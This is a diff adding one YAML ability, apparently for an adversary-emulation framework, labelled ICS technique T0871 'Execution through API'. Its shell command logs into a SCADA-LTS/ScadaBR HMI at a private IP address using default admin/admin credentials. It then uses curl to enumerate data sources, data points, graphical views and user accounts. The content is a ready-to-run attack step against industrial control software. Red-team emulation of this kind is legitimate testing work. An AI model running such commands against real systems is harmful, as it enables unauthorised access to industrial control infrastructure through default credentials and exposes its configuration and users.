@@ -1,0 +1,25 @@
+---
+
+- id: a7b8c9d0-7777-7777-7777-000000000001
+  name: SCADA-LTS - API Data Source Enumeration
+  description: |
+    Use SCADA-LTS REST API to enumerate all configured Modbus data
+    sources, data points, graphical views, and alarm configurations.
+  tactic: execution
+  technique_id: T0871
+  technique_name: Execution through API
+  executors:
+  - platform: linux
+    name: sh
+    command: >
+      HMI="http://192.168.90.107:8080/ScadaBR" &&
+      curl -s -c /tmp/hmi.jar -X POST "$HMI/login.htm"
+      -d "username=admin&password=admin" -L -o /dev/null &&
+      echo "=== Data Sources ===" &&
+      curl -s -b /tmp/hmi.jar "$HMI/api/datasources" 2>/dev/null &&
+      echo "" && echo "=== Data Points ===" &&
+      curl -s -b /tmp/hmi.jar "$HMI/api/datapoints" 2>/dev/null &&
+      echo "" && echo "=== Views ===" &&
+      curl -s -b /tmp/hmi.jar "$HMI/api/views" 2>/dev/null &&
+      echo "" && echo "=== Users ===" &&
+      curl -s -b /tmp/hmi.jar "$HMI/api/users" 2>/dev/null
